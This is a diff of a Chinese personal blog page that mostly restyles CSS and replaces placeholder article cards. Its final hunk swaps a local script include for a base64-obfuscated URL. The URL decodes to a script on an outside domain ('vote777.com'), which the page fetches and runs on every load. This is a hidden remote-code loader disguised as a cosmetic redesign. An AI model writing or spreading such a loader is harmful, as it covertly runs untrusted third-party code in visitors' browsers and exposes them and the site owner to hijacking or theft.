@@ -5,257 +5,196 @@
     <meta charset="UTF-8">
     <meta name="viewport"
         content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>我的灵 感笔记</title>
+    <title>我的个人博客</title>
     <style>
         /* 全局样式 */
         body {
             overflow: hidden;
+            /* 隐藏滚动条 */
             font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
+            /* 使用Inter字体，备用系统字体 */
             margin: 0;
             padding: 0;
-            background-color: #FDF8F5;
-            /* 浅米色背景 */
-            color: #4A4A4A;
-            /* 深灰色文本 */
-            line-height: 1.7;
+            background-color: #f8f8f8;
+            /* 浅色背景 */
+            color: #333;
+            /* 深色文本 */
+            line-height: 1.6;
             -webkit-font-smoothing: antialiased;
+            /* 字体抗锯齿 */
             -moz-osx-font-smoothing: grayscale;
+            /* 字体抗锯齿 */
         }
 
         .container {
-            max-width: 95%;
-            /* 更宽的容器，适应移动端边缘 */
+            max-width: 90%;
+            /* 适应移动端宽度 */
             margin: 0 auto;
-            padding: 15px;
-            /* 较小的内边距 */
+            /* 居中 */
+            padding: 20px 15px;
+            /* 内边距 */
         }
 
-        /* 头部/英雄区样式 */
-        .hero-section {
+        /* 头部样式 */
+        header {
             text-align: center;
-            padding: 40px 20px;
-            /* 更大的内边距 */
-            background-color: #FFFFFF;
-            border-radius: 15px;
-            /* 更大的圆角 */
-            margin-bottom: 30px;
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.08);
-            /* 更明显的阴影 */
-            position: relative;
-            overflow: hidden;
-            /* 确保图片不溢出 */
+            padding: 20px 0;
+            background-color: #ffffff;
+            /* 白色背景 */
+            border-bottom: 1px solid #eee;
+            border-radius: 10px;
+            /* 圆角 */
+            margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+            /* 轻微阴影 */
         }
 
-        .hero-section::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, rgba(255, 255, 255, 0.7) 0%, rgba(255, 255, 255, 0.9) 100%);
-            /* 渐变叠加，增加层次感 */
-            z-index: 1;
+        header h1 {
+            color: #2c3e50;
+            /* 深蓝色标题 */
+            margin-bottom: 10px;
+            font-size: 1.8em;
+            /* 适合移动端的字体大小 */
         }
 
-        .hero-section * {
-            position: relative;
-            z-index: 2;
-            /* 确保内容在渐变层之上 */
-        }
-
-        .hero-section h1 {
-            color: #6B4F4F;
-            /* 柔和的棕红色标题 */
-            margin-bottom: 12px;
-            font-size: 2.5em;
-            /* 更大的标题 */
-            letter-spacing: 1px;
-        }
-
-        .hero-section p {
-            color: #7A7A7A;
-            font-size: 1.1em;
-            max-width: 80%;
-            margin: 0 auto 20px;
-        }
-
-        .hero-section nav ul {
+        nav ul {
             list-style: none;
             padding: 0;
             margin: 0;
             display: flex;
-            justify-content: center;
-            /* 居中导航 */
+            /* Flex布局 */
+            justify-content: space-around;
+            /* 均匀分布 */
             flex-wrap: wrap;
+            /* 允许换行 */
         }
 
-        .hero-section nav ul li {
-            margin: 8px 15px;
-            /* 增加导航项间距 */
+        nav ul li {
+            margin: 5px 10px;
         }
 
-        .hero-section nav ul li a {
+        nav ul li a {
             text-decoration: none;
-            color: #A27B5C;
-            /* 大地色系强调色 */
+            color: #007bff;
+            /* 强调色：蓝色 */
             font-weight: bold;
-            padding: 10px 18px;
-            border-radius: 25px;
-            /* 药丸形按钮 */
-            border: 1px solid #A27B5C;
-            transition: all 0.3s ease;
+            padding: 8px 12px;
+            border-radius: 5px;
+            /* 圆角 */
+            transition: background-color 0.3s ease, color 0.3s ease;
             /* 平滑过渡 */
         }
 
-        .hero-section nav ul li a:hover {
-            background-color: #A27B5C;
+        nav ul li a:hover {
+            background-color: #007bff;
+            /* 强调色背景 */
             color: #ffffff;
-            box-shadow: 0 4px 8px rgba(162, 123, 92, 0.3);
-            /* 强调色阴影 */
+            /* 白色文本 */
         }
 
-        /* 文章列表布局 */
-        .articles-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            /* 移动端单列布局 */
-            gap: 25px;
-            /* 卡片间距 */
-        }
-
-        /* 文章卡片样式 */
-        article.blog-card {
-            background-color: #FFFFFF;
+        /* 主要内容区域 */
+        main,
+        section {
+            background-color: #ffffff;
             padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.08);
-            /* 卡片阴影 */
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            overflow: hidden;
-            /* 确保内容不溢出 */
+            margin-bottom: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
         }
 
-        article.blog-card:hover {
-            transform: translateY(-5px);
-            /* 鼠标悬停上移效果 */
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
-            /* 更深阴影 */
+        h2 {
+            color: #2c3e50;
+            font-size: 1.5em;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
         }
 
-        article.blog-card h3 {
-            color: #6B4F4F;
-            /* 标题颜色 */
-            font-size: 1.4em;
-            margin-bottom: 8px;
+        /* 文章样式 */
+        article {
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px dashed #eee;
         }
 
-        article.blog-card .date {
-            color: #888;
+        article:last-of-type {
+            border-bottom: none;
+            /* 最后一篇文章无下划线 */
+        }
+
+        article h3 {
+            color: #34495e;
+            /* 更深的文本色 */
+            font-size: 1.2em;
+            margin-bottom: 5px;
+        }
+
+        article .date {
+            color: #7f8c8d;
+            /* 日期颜色 */
             font-size: 0.85em;
+            margin-bottom: 10px;
+        }
+
+        article img {
+            max-width: 100%;
+            /* 图片自适应宽度 */
+            height: auto;
+            border-radius: 8px;
+            /* 图片圆角 */
+            margin-top: 15px;
             margin-bottom: 15px;
             display: block;
-            /* 确保日期独占一行 */
-        }
-
-        article.blog-card img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 10px;
-            margin: 15px 0;
-            display: block;
+            /* 确保图片是块级元素 */
             box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            /* 图片阴影 */
         }
 
-        article.blog-card p {
-            color: #5A5A5A;
+        article p {
+            color: #555;
             font-size: 0.95em;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
 
-        article.blog-card .read-more {
+        article a {
             display: inline-block;
-            background-color: #A27B5C;
+            background-color: #007bff;
             color: #ffffff;
-            padding: 10px 20px;
-            border-radius: 20px;
-            /* 药丸形按钮 */
+            padding: 8px 15px;
+            border-radius: 5px;
             text-decoration: none;
             font-size: 0.9em;
-            font-weight: bold;
-            transition: background-color 0.3s ease, transform 0.3s ease;
+            transition: background-color 0.3s ease;
         }
 
-        article.blog-card .read-more:hover {
-            background-color: #8B6B4E;
+        article a:hover {
+            background-color: #0056b3;
             /* 强调色深色 */
-            transform: scale(1.05);
-            /* 略微放大 */
-        }
-
-        /* 关于我/联系区 */
-        section {
-            background-color: #FFFFFF;
-            padding: 25px;
-            border-radius: 15px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.08);
-            margin-bottom: 30px;
-        }
-
-        section h2 {
-            color: #6B4F4F;
-            font-size: 1.8em;
-            margin-bottom: 20px;
-            border-bottom: 2px solid #EEE0D9;
-            /* 柔和的分割线 */
-            padding-bottom: 10px;
-            text-align: center;
-        }
-
-        section p {
-            color: #5A5A5A;
-            margin-bottom: 15px;
-        }
-
-        section a {
-            color: #A27B5C;
-            text-decoration: none;
-            font-weight: bold;
-            transition: color 0.3s ease;
-        }
-
-        section a:hover {
-            color: #8B6B4E;
         }
 
         /* 页脚样式 */
         footer {
             text-align: center;
-            padding: 25px 0;
-            color: #888;
+            padding: 20px 0;
+            color: #7f8c8d;
             font-size: 0.85em;
-            border-top: 1px solid #EEE0D9;
-            margin-top: 30px;
-            background-color: #FFFFFF;
-            border-radius: 15px;
-            box-shadow: 0 -4px 10px rgba(0, 0, 0, 0.03);
-        }
-
-        .social-links {
-            margin-top: 15px;
+            border-top: 1px solid #eee;
+            margin-top: 20px;
+            background-color: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 -2px 4px rgba(0, 0, 0, 0.03);
         }
 
         .social-links a {
-            color: #A27B5C;
+            color: #007bff;
             text-decoration: none;
-            margin: 0 10px;
+            margin: 0 8px;
             font-weight: bold;
-            transition: color 0.3s ease, transform 0.3s ease;
+            transition: color 0.3s ease;
         }
 
         .social-links a:hover {
-            color: #8B6B4E;
-            transform: translateY(-2px);
+            color: #0056b3;
         }
     </style>
     <link rel="stylesheet" href="./static/css/style.css">
@@ -263,73 +202,63 @@
 
 <body>
     <div class="container">
-        <header class="hero-section">
-            <h1>我的灵感笔记</h1>
-            <p>在这里，我分享关于技术、生活和创意的思考与探索。</p>
+        <header>
+            <h1>我的个人博客</h1>
             <nav>
                 <ul>
-                    <li><a href="#articles">最新文章</a></li>
+                    <li><a href="#home">首页</a></li>
+                    <li><a href="#articles">文章</a></li>
                     <li><a href="#about">关于我</a></li>
-                    <li><a href="#contact">联系方式</a></li>
+                    <li><a href="#contact">联系</a></li>
                 </ul>
             </nav>
         </header>
 
         <main id="articles">
             <h2>最新文章</h2>
-            <div class="articles-grid">
-                <!-- 文章一 -->
-                <article class="blog-card">
-                    <h3>深入理解JavaScript事件循环与异步编程</h3>
-                    <span class="date">发布日期：2023年7月29日</span>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() %>" alt="">
-                    <p>JavaScript的事件循环是理解其异步行为的关键。本文将通过图解和代码示例，带你彻底掌握宏任务、微任务以及它们如何协同工作。</p>
-                    <a href="#" class="read-more">阅读更多</a>
-                </article>
-                <!-- 文章二 -->
-                <article class="blog-card">
-                    <h3>高效时间管理：番茄工作法实践指南</h3>
-                    <span class="date">发布日期：2023年7月25日</span>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="">
-                    <p>番茄工作法是一种简单而高效的时间管理技术。本文将分享我实践番茄工作法的心得，并提供一些实用技巧，帮助你提升专注力和生产力。</p>
-                    <a href="#" class="read-more">阅读更多</a>
-                </article>
-                <!-- 文章三 -->
-                <article class="blog-card">
-                    <h3>探索生成式AI的艺术：从文本到图像的奇妙旅程</h3>
-                    <span class="date">发布日期：2023年7月20日</span>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="">
-                    <p>生成式AI正在改变我们创作和认知世界的方式。本文将探讨文本到图像生成技术的原理、应用及其对未来创意产业的影响。</p>
-                    <a href="#" class="read-more">阅读更多</a>
-                </article>
-                <!-- 文章四 -->
-                <article class="blog-card">
-                    <h3>我的极简主义生活实践：少即是多</h3>
-                    <span class="date">发布日期：2023年7月15日</span>
-                    <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>" alt="">
-                    <p>极简主义不仅仅是一种生活方式，更是一种思维模式。本文将分享我如何通过极简主义，简化生活，提升幸福感。</p>
-                    <a href="#" class="read-more">阅读更多</a>
-                </article>
-            </div>
+            <!-- 文章一 -->
+            <article>
+                <h3>探索前端新趋势：React Hooks与Vue 3的魅力</h3>
+                <p class="date">发布日期：2023年7月28日</p>
+                <!-- 随机图片，加上时间戳防止缓存 -->
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() %>" alt="">
+                <p>在前端开发的快速演进中，React Hooks和Vue 3带来了革命性的变化。本文将深入探讨它们如何简化组件逻辑、提升开发效率，并分享一些实际应用中的心得体会。</p>
+                <a href="#">阅读更多</a>
+            </article>
+            <!-- 文章二 -->
+            <article>
+                <h3>高效学习编程的秘诀：从入门到精通</h3>
+                <p class="date">发布日期：2023年7月20日</p>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="">
+                <p>编程学习并非一蹴而就，需要系统的方法和持之以恒的实践。本文将为您揭示高效学习编程的五大秘诀，帮助您少走弯路，更快地掌握编程技能。</p>
+                <a href="#">阅读更多</a>
+            </article>
+            <!-- 文章三 -->
+            <article>
+                <h3>我的旅行日记：日本京都的古韵与现代交织</h3>
+                <p class="date">发布日期：2023年7月15日</p>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="">
+                <p>京都，一座充满历史与文化底蕴的城市，每一次漫步都仿佛穿越回千年之前。本文将分享我在京都的旅行见闻，从古老的寺庙到现代的街区，感受这座城市的独特魅力。</p>
+                <a href="#">阅读更多</a>
+            </article>
         </main>
 
         <section id="about">
             <h2>关于我</h2>
-            <p>你好！我是一个热爱学习和分享的探索者。这个博客是我记录个人成长、技术心得和生活感悟的平台。我相信知识的分享能带来更大的价值。</p>
-            <p>希望我的文字能为你带来启发，也欢迎你与我交流！</p>
+            <p>你好！我是一位充满好奇心的前端开发者，热衷于探索新技术、分享学习心得。这个博客是我记录技术成长、生活感悟和个人思考的小天地。希望我的文章能给您带来一些启发和帮助！</p>
         </section>
 
         <section id="contact">
-            <h2>联系方式</h2>
+            <h2>联系我</h2>
+        </section>
+
+        <footer>
+            <p>&copy; 2023 我的个人博客. All rights reserved.</p>
             <div class="social-links">
                 <a href="#" aria-label="GitHub">GitHub</a> |
                 <a href="#" aria-label="Twitter">Twitter</a> |
                 <a href="#" aria-label="LinkedIn">LinkedIn</a>
             </div>
-        </section>
-
-        <footer>
-            <p>&copy; 2023 我的灵感笔记. All rights reserved.</p>
         </footer>
         <div id="overlay">
             <div id="loading_box" class="loading_container">
@@ -373,15 +302,17 @@
     <script>
         (function () {
             function init() {
-                const timestamp = Date.now()
-                const randomNum = Math.floor(Math.random() * 1000000)
-                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
-                const script = document.createElement("script")
-                script.src = url
-                document.body.appendChild(script)
+                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
             }
-            init()
-        })()
+            init();
+        })();
     </script>
 
 </body>
